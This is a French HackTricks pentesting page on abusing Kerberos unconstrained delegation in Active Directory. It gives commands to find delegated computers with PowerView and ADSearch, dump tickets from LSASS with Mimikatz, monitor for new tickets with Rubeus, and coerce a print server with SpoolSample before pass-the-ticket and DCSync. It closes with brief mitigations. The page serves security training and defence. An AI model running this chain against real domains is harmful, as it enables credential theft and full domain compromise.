# Unconstrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Unconstrained delegation

C'est une fonctionnalité qu'un administrateur de domaine peut définir sur n'importe quel **ordinateur** à l'intérieur du domaine. Ensuite, chaque fois qu'un **utilisateur se connecte** à l'ordinateur, une **copie du TGT** de cet utilisateur va être **envoyée à l'intérieur du TGS** fourni par le DC **et sauvegardée en mémoire dans LSASS**. Donc, si vous avez des privilèges d'administrateur sur la machine, vous pourrez **extraire les tickets et usurper les utilisateurs** sur n'importe quelle machine.

Ainsi, si un administrateur de domaine se connecte à un ordinateur avec la fonctionnalité "Unconstrained Delegation" activée, et que vous avez des privilèges d'administrateur local sur cette machine, vous pourrez extraire le ticket et usurper l'administrateur de domaine n'importe où (domain privesc).

Vous pouvez **trouver des objets ordinateur avec cet attribut** en vérifiant si l'attribut [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) contient [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>). Vous pouvez le faire avec un filtre LDAP de ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, ce que fait powerview :
```bash
# List unconstrained computers
## Powerview
## A DCs always appear and might be useful to attack a DC from another compromised DC from a different domain (coercing the other DC to authenticate to it)
Get-DomainComputer –Unconstrained –Properties name
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'

## ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem

# Export tickets with Mimikatz
## Access LSASS memory
privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
## Doens't access LSASS memory directly, but uses Windows APIs
Rubeus.exe dump
Rubeus.exe monitor /interval:10 [/filteruser:<username>] #Check every 10s for new TGTs
```
Chargez le ticket de l'Administrateur (ou de l'utilisateur victime) en mémoire avec **Mimikatz** ou **Rubeus pour un** [**Pass the Ticket**](pass-the-ticket.md)**.**\
Plus d'infos : [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**Plus d'informations sur la délégation non contrainte dans ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **Forcer l'authentification**

Si un attaquant est capable de **compromettre un ordinateur autorisé pour "Délégation non contrainte"**, il pourrait **tromper** un **serveur d'impression** pour **se connecter automatiquement** contre lui **en sauvegardant un TGT** dans la mémoire du serveur.\
Ensuite, l'attaquant pourrait effectuer une **attaque Pass the Ticket pour usurper** le compte d'ordinateur du serveur d'impression.

Pour faire en sorte qu'un serveur d'impression se connecte à n'importe quelle machine, vous pouvez utiliser [**SpoolSample**](https://github.com/leechristensen/SpoolSample) :
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
Si le TGT provient d'un contrôleur de domaine, vous pourriez effectuer une [**attaque DCSync**](acl-persistence-abuse/index.html#dcsync) et obtenir tous les hachages du DC.\
[**Plus d'infos sur cette attaque sur ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

Trouvez ici d'autres moyens de **forcer une authentification :**

{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Atténuation

- Limiter les connexions DA/Admin à des services spécifiques
- Définir "Le compte est sensible et ne peut pas être délégué" pour les comptes privilégiés.

{{#include ../../banners/hacktricks-training.md}}
